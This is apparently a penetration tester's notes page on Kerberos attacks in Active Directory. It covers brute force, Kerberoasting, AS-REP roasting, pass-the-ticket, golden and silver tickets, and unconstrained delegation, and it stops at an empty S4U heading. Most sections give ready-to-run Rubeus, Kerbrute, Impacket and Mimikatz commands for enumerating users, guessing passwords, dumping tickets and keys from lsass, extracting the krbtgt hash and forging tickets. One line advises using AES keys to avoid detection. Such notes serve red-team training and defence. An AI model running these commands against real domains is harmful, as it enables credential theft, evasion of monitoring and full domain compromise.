# Brute Force
We can brute force username and password based on the errors that we get from kerberos.
- `KDC_ERR_PREAUTH_FAILED`: Incorrect password
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: Invalid username
- `KDC_ERR_WRONG_REALM`: Invalid domain
- `KDC_ERR_CLIENT_REVOKED`: Disabled/Blocked user
### Rubeus
```powershell
./rubeus.exe brute /password:<password> /noticket
```
### Kerbrute (go)
1. User Enumeration
```bash
./kerbrute userenum -d mydomain.local usernames.txt
```
2. Password brute-force
```bash
cat user_password.txt | ./kerbrute -d mydomain.local bruteforce -
```
### Kerbrute.py
```bash
python kerbrute.py -domain mydomain.local -users user.txt -passwords pass.txt -dc-ip <ip>
```
# Kerberoast
- ST can be requested by any user for any service if it's [[Active Directory/AD Concepts/Services#SPN|SPN]] is registered in the domain.
- STs are encrypted with the service account which runs the service.
- Hence, we can try to crack the password of the service user account.
- In case of managed service accounts, the password is of 120 characters and changes every month, hence it is not possible to crack their password.
- However, some services are run with normal user accounts, managed by people, that can have weak password.
- Kerberoast involves service running under regular user accounts. We can request STs for the services and crack password locally.
We can query for users with SPNs with LDAP module or AD-RSAT module
- LDAP
```ladp
(&(samAccountType=805306368)(servicePrincipalName=*))
```
- AD-RSAT
```powershell

```
Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
```bash
# This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
python GetUserSPNs.py 'mydomain.local@a.drdragon:Password!!' -dc-ip <ip> -outputfile kerberoast.hash
```
# AS-REPRoast
- In kerberos, pre-authentication is required for users. 
- Pre-Authentication is when a user sends the timestamp encrypted with it's kerberos key to request TGT (AS-REQ)
- In some cases, some users may have the `DONT_REQUIRE_PREAUTH` flag set. These users don't need to encrypt their timestamp with their kerberos key, hence anyone can create AS-REQ as that user and receive AS-REP encrypted with these users's key.
- AS-REProast involves impersonating these users and receiving the AS-REP. The AS-REP can be cracked offline to recover the password of the user.
- LDAP filter to query users without pre-authentication.
```ldap
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```
- Impacket's GetNPUsers.py script can be used to get the users without pre-authentication and get their AS-REP data.
```bash
GetNPUsers.py 'mydomain.local\drdragon:Password!!' --dc-ip -outputfile asrep-hashes.txt
```

# Pass the Key/Overpass the Hash
- To request a TGT, the user needs to send a timestamp encrypted with it's key.
- If we have a user's key, it can be used to request a TGT of the user.
- Kerberos keys are cached in `lsass` process. Can be extracted using [[Active Directory/Credential Dumping/Mimikatz|Mimikatz]]
```bash
sekurlsa::ekeys
```

# Pass the Ticket
- Pass the ticket involves stealing the ticket and the session key and using it impersonate the user to get access to resources or services.
- TGT & ST can be used, but TGTs are preferred because we get access to any service.
### Mimikatz
```bash
# Tickets can be extracted from lsass memory using the following command
sekurlsa::tickets /export
# On linux, it the keys are located in files. Location of these files can be found in the kerberos configuration files: `/etc/krb5.conf`.

# Use the tickets
kerberos::ptt my-tgt.kirbi
# This purges the current tickets from memory and injects the specified tickets

# verify the ticket 
klist
```
### Rubeus
```bash
.\Rubeus.exe dump # Dumps the tickets 
# Dumps all ticket when run with elevated privilege
.\Rubeus.exe /nowrap # dumps ticket with no new lines
.\Rubeus.exe /service:krbtgt # specify service

# Using the ticket
.\Rubeus.exe ptt /ticket:<base64ticket> 

# Verify the ticket
klist
```
# Golden Tickets
- TGTs are encrypted with the `krbtgt`'s key derived from it's password.
- If we get hold of this key, we can forge TGTs for any user. These tickets are called Golden Tickets.
- This can be done using dumping credential of the domain controller or via [[DCSync]] attack.
- This can also be done by dumping the NTDS.dit file locally.
- Using impacket's secretsdump.py:
```bash
secretsdump.py 'mydomain.local/drdragon@192.168.2.2' -just-dc-user krbtgt
```
- To issue TGTs from the keys, impacket's ticketer.py can be used:
```bash
ticketer.py -domain-sid <domainSID> -domain mydomain.local -aes <aesKey> Administrator
# This will create the TGT for the Administrator user and save it in Administrator.ccache
```
- AES256 keys should be used to avoid any alerts or detection.
# Silver Tickets
- STs are encrypted with the service user's key derived from it's password.
- If we have this key, we can forge ST's for any service running under that user. These tickets are called Silver Tickets.
- The key can be dumped from the lsass process memory or by [[#Kerberoast]], or dumping the entire AD Database (NTDS.dit file)
- The PAC is signed with the `krbtgt`'s account, hence a fake signature is used to create the PAC. The PAC signature is not verified if the the ticket is less than 20 minutes old. We can also add more privilege to the PAC, as it is not verified. For example, we can modify the PAC user group to include the `Domain Admins`. 

# Unconstrained Delegation
When a user requests for ST, and if the service owner has the `TRUSTED_FOR_DELEGATION` flag set in [[Active Directory/AD Concepts/Users#User Account Control|User Account Control]], the ST received from the KCD will have the `OK_AS_DELEGATE` flag set.
To set `TRUSTED_FOR_DELEGATION` flag in User Account Control, the user needs to have `SeEnableDelegationPrivilege` privilege.

#### Ticket Acquisition
- Client requests for the ST for a service with SPN `HTTP\webserv` which is owned by `websrv$` machine account.
- The KDC checks for `TRUSTED_FOR_DELEGATION` in `websrv$` account's UAC. KDC returns a ST with `OK_AS_DELEGATE` and `FORWARDABLE` flag set.
- The Client checks of these flags and asks a `FORWARDED` TGT. The KDC responds with a TGT with `FORWARDED` flag set.
- The Client sends the ST and the `FORWARDED` TGT to the service for access. 
- The Serivice uses this TGT to request ST for `MSSQLSvc\dbsrv` serivce.
- Websrv uses the ST to get access to the MSSQL service.

### Flaw
If the service account that is `TRUSTED_FOR_DELEGATION` is compromised, we get access to TGTs for uses that have tried to connect to this service. Mimikatz can be used to get access to the TGTs cached in lsass process.
```mimi
mimikatz sekurlsa::tickets
```
### Identifying accounts with unconstrained delegation
```ldap
(UserAccountControl:1.2.840.113556.1.4.803:=524288)
```

# S4U Attacks
